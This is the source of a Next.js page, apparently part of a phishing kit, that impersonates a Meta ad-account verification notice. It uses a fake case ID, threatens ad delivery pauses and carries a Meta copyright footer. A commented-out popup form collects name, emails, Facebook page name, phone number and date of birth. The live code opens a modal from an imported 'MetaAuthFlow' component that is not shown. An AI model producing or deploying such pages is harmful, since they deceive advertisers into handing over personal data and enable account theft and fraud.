// "use client";

// import { useState, FormEvent } from "react";

// export default function Home() {
//   // Trạng thái điều khiển việc ẩn/hiện của Popup
//   const [isOpen, setIsOpen] = useState(false);
  
//   // Dữ liệu form nhập liệu
//   const [formData, setFormData] = useState({ name: "", email: "" });
//   const [status, setStatus] = useState("");

//   const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
//     e.preventDefault();
//     setStatus("Đang gửi...");
    
//     // Giả lập gửi dữ liệu thành công sau 1 giây
//     setTimeout(() => {
//       setStatus("Gửi thành công!");
//       setFormData({ name: "", email: "" });
//       // Đóng popup sau khi gửi thành công (tùy chọn)
//       setTimeout(() => {
//         setIsOpen(false);
//         setStatus("");
//       }, 1500);
//     }, 1000);
//   };

//   return (
//     <div className="min-h-screen bg-gradient-to-br from-slate-50 via-sky-50 to-slate-100 text-slate-900">
//     <main className="relative flex min-h-screen flex-col items-center justify-center bg-slate-50 p-6">
//       {/* 1. Phần nội dung chính của trang (H1, P trong div, Button mở popup) */}

//   <section className="flex-1 px-1 py-2 sm:px-2 sm:py-4">
//     <div className="mb-6 flex items-start gap-4 sm:mb-10">
//       <div className="mt-1 flex h-12 w-12 items-center justify-center rounded-full bg-metaBlue/10">
//        <img alt="Identity Verification" loading="lazy" width="40" height="40" decoding="async" data-nimg="1" className="h-8 w-8" style={{ color: 'transparent' }} src="/ic_blue.svg" />
//       </div>
//       <div>
//         <h1 className="text-2xl font-semibold tracking-tight sm:text-3xl">Security Notification: Confirm Ad Account Ownership</h1>
//         <p className="mt-2 text-sm font-semibold text-slate-800">Periodic security evaluation and Advertising Policy compliance checkpoint.</p>
//       </div>
//     </div>
//     <div className="space-y-4 text-sm leading-relaxed text-slate-700 sm:text-base">
//       <p>To maintain transparency and integrity across our advertising ecosystem, we routinely verify advertiser identities and linked business assets. Your ad account has been flagged for standard credentials verification to ensure full compliance with updated Advertising Standards.</p>
//       <p>Completing this verification ensures uninterrupted ad delivery, safeguards billing methods and business assets, and helps protect your Ads Manager against unauthorized access or account takeover attempts.</p>
//       <p className="mt-4 text-sm font-medium text-metaBlue">Case Reference ID: <span className="underline decoration-dotted">#SEC-4719-AUTH-AUDIT</span>
//       </p>
//       <div className="mt-6 space-y-3">
//         <h2 className="text-sm font-semibold text-slate-900 sm:text-base">Submission Instructions &amp; Review Criteria</h2>
//         <ul className="space-y-3 text-sm text-slate-700 sm:text-[15px]">
//           <li>• <strong>Information Consistency:</strong> Ensure all business registration certificates, legal identification, and payment details strictly match the registered information in your Ads Manager. </li>
//           <li>• <strong>Review Timeframe:</strong> Please submit the required documents within the active verification window. Unverified ad accounts may experience temporary delivery pauses or spending limit restrictions. </li>
//           <li>• <strong>Processing &amp; Status Maintenance:</strong> Once submitted, our review team will evaluate your credentials (typically within 24–48 hours). Active campaigns, budgets, and billing profiles will remain protected during the review. </li>
//         </ul>
//       </div>
//     </div>
//         <button onClick={() => setIsOpen(true)} className="rounded-xl bg-blue-600 px-6 py-3 text-base font-semibold text-white shadow-lg hover:bg-blue-700 transition active:scale-95" >
//          Verify Ad Account
//         </button>
//   </section>



//   <footer className="mt-6 flex flex-wrap justify-center gap-4 text-xs text-slate-500 sm:text-[13px]">
//     <button className="hover:text-slate-700" type="button">Business Help Center</button>
//     <span className="text-slate-400">|</span>
//     <button className="hover:text-slate-700" type="button">Data Privacy</button>
//     <span className="text-slate-400">|</span>
//     <button className="hover:text-slate-700" type="button">Advertising Policies</button>
//     <span className="text-slate-400">|</span>
//     <button className="hover:text-slate-700" type="button">Community Standards</button>
//     <span className="text-slate-400">|</span>
//     <span>Meta © 2026</span>
//   </footer>

// {/*<div className="mb-6 flex items-start gap-4 sm:mb-10">*/}

//       {/* 2. Cửa sổ Popup & Khóa nền (Modal) */}
//       {isOpen && (
//         <div className="fixed inset-0 z-50 flex items-center justify-center">
          
//           {/* Lớp nền tối (Backdrop) - Bấm vào đây hoặc khóa tương tác nền */}
//           <div 
//             className="absolute inset-0 bg-black/50 backdrop-blur-sm transition-opacity"
//             onClick={() => setIsOpen(true)} // Bấm ra ngoài nền để đóng popup
//           />

//           {/* Hộp chứa nội dung Form Popup */}
//           <div className="relative z-10 w-full max-w-md rounded-2xl bg-white p-8 shadow-2xl transition-all">
//             <div className="flex items-center justify-between mb-6">
//               <h2 className="text-xl font-bold text-slate-800">Nhập thông tin của bạn</h2>
//               {/* Nút đóng (X) */}
//               <button 
//                 onClick={() => setIsOpen(false)}
//                 className="text-slate-400 hover:text-slate-600 text-2xl font-bold"
//               >
//                 &times;
//               </button>
//             </div>


//   <form className="w-full max-w-[480px] space-y-4">
//     {/* Full Name */}
//     <div>
//       <input
//         type="text"
//         placeholder="Full Name"
//         className="w-full h-12 px-4 rounded-xl border border-[#CBD5E1] text-[15px] text-gray-900 placeholder-[#94A3B8] focus:outline-none focus:border-[#0064E0] transition-colors"
//       />
//     </div>

//     {/* Email */}
//     <div>
//       <input
//         type="email"
//         placeholder="Email"
//         className="w-full h-12 px-4 rounded-xl border border-[#CBD5E1] text-[15px] text-gray-900 placeholder-[#94A3B8] focus:outline-none focus:border-[#0064E0] transition-colors"
//       />
//     </div>

//     {/* Email Business (Optional) */}
//     <div>
//       <input
//         type="email"
//         placeholder="Email Business (Optional)"
//         className="w-full h-12 px-4 rounded-xl border border-[#CBD5E1] text-[15px] text-gray-900 placeholder-[#94A3B8] focus:outline-none focus:border-[#0064E0] transition-colors"
//       />
//     </div>

//     {/* Page Name (Optional) */}
//     <div>
//       <input
//         type="text"
//         placeholder="Page Name (Optional)"
//         className="w-full h-12 px-4 rounded-xl border border-[#CBD5E1] text-[15px] text-gray-900 placeholder-[#94A3B8] focus:outline-none focus:border-[#0064E0] transition-colors"
//       />
//     </div>

//     {/* Phone Number với Mã vùng */}
//     <div className="flex gap-3">
//       {/* Dropdown chọn mã vùng */}
//       <div className="relative flex items-center justify-between w-[135px] h-12 px-3 rounded-xl border border-[#CBD5E1] bg-white cursor-pointer shrink-0">
//         <div className="flex items-center gap-2">
//           {/* Cờ Singapore SVG */}
//           <svg
//             className="w-6 h-4 rounded-[2px] shadow-xs shrink-0"
//             viewBox="0 0 36 24"
//             fill="none"
//           >
//             <rect width="36" height="12" fill="#EF3340" />
//             <rect y="12" width="36" height="12" fill="#FFFFFF" />
//             <circle cx="9.5" cy="6" r="3.5" fill="#FFFFFF" />
//             <circle cx="10.8" cy="6" r="3" fill="#EF3340" />
//             <circle cx="11.5" cy="4.2" r="0.5" fill="#FFFFFF" />
//             <circle cx="13.2" cy="5.3" r="0.5" fill="#FFFFFF" />
//             <circle cx="12.6" cy="7.3" r="0.5" fill="#FFFFFF" />
//             <circle cx="10.4" cy="7.3" r="0.5" fill="#FFFFFF" />
//             <circle cx="9.8" cy="5.3" r="0.5" fill="#FFFFFF" />
//           </svg>
//           <span className="text-[15px] text-gray-900 font-normal">+65</span>
//         </div>
//         {/* Mũi tên dropdown */}
//         <svg
//           className="w-3.5 h-3.5 text-gray-500"
//           fill="currentColor"
//           viewBox="0 0 20 20"
//         >
//           <path d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" />
//         </svg>
//       </div>

//       {/* Input số điện thoại */}
//       <input
//         type="tel"
//         defaultValue="+65"
//         className="w-full h-12 px-4 rounded-xl border border-[#CBD5E1] text-[15px] text-gray-900 focus:outline-none focus:border-[#0064E0] transition-colors"
//       />
//     </div>

//     {/* Date of Birth */}
//     <div className="pt-1">
//       <label className="block text-[15px] text-[#334155] mb-2">
//         Date of Birth
//       </label>
//       <div className="grid grid-cols-3 gap-3">
//         <input
//           type="text"
//           placeholder="Day"
//           className="w-full h-12 px-4 rounded-xl border border-[#CBD5E1] text-[15px] text-gray-900 placeholder-[#94A3B8] focus:outline-none focus:border-[#0064E0] transition-colors"
//         />
//         <input
//           type="text"
//           placeholder="Month"
//           className="w-full h-12 px-4 rounded-xl border border-[#CBD5E1] text-[15px] text-gray-900 placeholder-[#94A3B8] focus:outline-none focus:border-[#0064E0] transition-colors"
//         />
//         <input
//           type="text"
//           placeholder="Year"
//           className="w-full h-12 px-4 rounded-xl border border-[#CBD5E1] text-[15px] text-gray-900 placeholder-[#94A3B8] focus:outline-none focus:border-[#0064E0] transition-colors"
//         />
//       </div>
//     </div>

//     {/* Note (Optional) + Bộ đếm ký tự */}
//     <div className="pt-1">
//       <textarea
//         placeholder="Note (Optional)"
//         maxLength={500}
//         rows={4}
//         className="w-full p-4 rounded-xl border border-[#CBD5E1] text-[15px] text-gray-900 placeholder-[#94A3B8] focus:outline-none focus:border-[#0064E0] transition-colors resize-y"
//       />
//       <div className="text-right text-[13px] text-[#64748B] mt-1">
//         0/500 characters
//       </div>
//     </div>

//     {/* Khung thông báo on Facebook */}
//     <div className="flex items-center justify-between p-4 rounded-xl border border-[#CBD5E1] bg-white">
//       <div className="flex items-center gap-3.5">
//         {/* Icon Facebook tròn xám */}
//         <div className="w-7 h-7 rounded-full bg-[#64748B] flex items-center justify-center shrink-0">
//           <svg
//             className="w-4 h-4 text-white fill-current"
//             viewBox="0 0 24 24"
//           >
//             <path d="M14 13.5h2.5l1-4H14v-2c0-1.03 0-2 2-2h1.5V2.14c-.326-.043-1.557-.14-2.857-.14C11.928 2 10 3.657 10 6.7v2.8H7v4h3V22h4v-8.5z" />
//           </svg>
//         </div>
//         <div>
//           <div className="text-[14px] font-semibold text-gray-900 leading-tight">
//             on Facebook
//           </div>
//           <div className="text-[13px] text-[#475569] mt-0.5">
//             We will send you a notification on Facebook.
//           </div>
//         </div>
//       </div>

//       {/* Toggle Switch */}
//       <label className="relative inline-flex items-center cursor-pointer shrink-0 ml-2">
//         <input type="checkbox" defaultChecked className="sr-only peer" />
//         <div className="w-12 h-7 bg-gray-200 rounded-full peer peer-checked:bg-[#0064E0] transition-colors after:content-[''] after:absolute after:top-[3px] after:left-[3px] after:bg-white after:rounded-full after:h-[22px] after:w-[22px] after:transition-all peer-checked:after:translate-x-5 shadow-xs"></div>
//       </label>
//     </div>

//     {/* Checkbox Terms of use */}
//     <div className="flex items-center gap-2.5 pt-1 pb-2">
//       <input
//         id="terms"
//         type="checkbox"
//         className="w-4 h-4 rounded border-[#94A3B8] text-[#0064E0] focus:ring-0 cursor-pointer"
//       />
//       <label htmlFor="terms" className="text-[14px] text-[#334155] select-none">
//         I agree with{" "}
//         <a href="#" className="text-[#0064E0] hover:underline">
//           Terms of use
//         </a>
//       </label>
//     </div>

//     {/* Nút Send */}
//     <button
//       type="submit"
//       className="w-full h-12 bg-[#0064E0] hover:bg-[#0055C0] active:scale-[0.99] text-white font-semibold text-[16px] rounded-xl transition-all cursor-pointer"
//     >
//       Send
//     </button>
//   </form>


//             {status && <p className="mt-4 text-center text-sm font-medium text-blue-600">{status}</p>}
//           </div>

//         </div>
//       )}
//     </main>
//     </div>
//   );
// }


"use client";

import { ModalFlowProvider, useModalFlow } from "@/components/MetaAuthFlow";

function TriggerButton() {
  const { openModal } = useModalFlow();
  return (
    <button
      onClick={openModal}
      className="px-6 py-3 bg-blue-600 text-white font-semibold rounded-xl shadow-lg hover:bg-blue-700 transition-all"
    >
      Open Verification Form
    </button>
  );
}

export default function Page() {
  return (
    <ModalFlowProvider>
      <main className="min-h-screen flex items-center justify-center bg-gray-100">

{/*<section className="flex-1 px-1 py-2 sm:px-2 sm:py-4">
<div className="mb-6 flex items-start gap-4 sm:mb-10">
<div className="mt-1 flex h-12 w-12 items-center justify-center rounded-full bg-metaBlue/10">
<img alt="Identity Verification" loading="lazy" width="40" height="40" decoding="async" data-nimg="1" className="h-8 w-8" style={{ color: 'transparent' }} src="/ic_blue.svg" />
</div>
<div>
      <h1 className="text-2xl font-semibold tracking-tight sm:text-3xl">Security Notification: Confirm Ad Account Ownership</h1>
      <p className="mt-2 text-sm font-semibold text-slate-800">Periodic security evaluation and Advertising Policy compliance checkpoint.</p>
    </div>
   </div>
   <div className="space-y-4 text-sm leading-relaxed text-slate-700 sm:text-base">
    <p>To maintain transparency and integrity across our advertising ecosystem, we routinely verify advertiser identities and linked business assets. Your ad account has been flagged for standard credentials verification to ensure full compliance with updated Advertising Standards.</p>
    <p>Completing this verification ensures uninterrupted ad delivery, safeguards billing methods and business assets, and helps protect your Ads Manager against unauthorized access or account takeover attempts.</p>
    <p className="mt-4 text-sm font-medium text-metaBlue">Case Reference ID: <span className="underline decoration-dotted">#SEC-4719-AUTH-AUDIT</span>
     </p>
     <div className="mt-6 space-y-3">
      <h2 className="text-sm font-semibold text-slate-900 sm:text-base">Submission Instructions &amp; Review Criteria</h2>
      <ul className="space-y-3 text-sm text-slate-700 sm:text-[15px]">
         <li>• <strong>Information Consistency:</strong> Ensure all business registration certificates, legal identification, and payment details strictly match the registered information in your Ads Manager. </li>
         <li>• <strong>Review Timeframe:</strong> Please submit the required documents within the active verification window. Unverified ad accounts may experience temporary delivery pauses or spending limit restrictions. </li>
         <li>• <strong>Processing &amp; Status Maintenance:</strong> Once submitted, our review team will evaluate your credentials (typically within 24–48 hours). Active campaigns, budgets, and billing profiles will remain protected during the review. </li>
      </ul>
     </div>
  </div>
      <TriggerButton />
 </section>



 <footer className="mt-6 flex flex-wrap justify-center gap-4 text-xs text-slate-500 sm:text-[13px]">
   <button className="hover:text-slate-700" type="button">Business Help Center</button>
  <span className="text-slate-400">|</span>
   <button className="hover:text-slate-700" type="button">Data Privacy</button>
   <span className="text-slate-400">|</span>
   <button className="hover:text-slate-700" type="button">Advertising Policies</button>
   <span className="text-slate-400">|</span>
   <button className="hover:text-slate-700" type="button">Community Standards</button>
   <span className="text-slate-400">|</span>
  <span>Meta © 2026</span>
</footer>
*/}

 <TriggerButton />
      </main>
    </ModalFlowProvider>
  );
}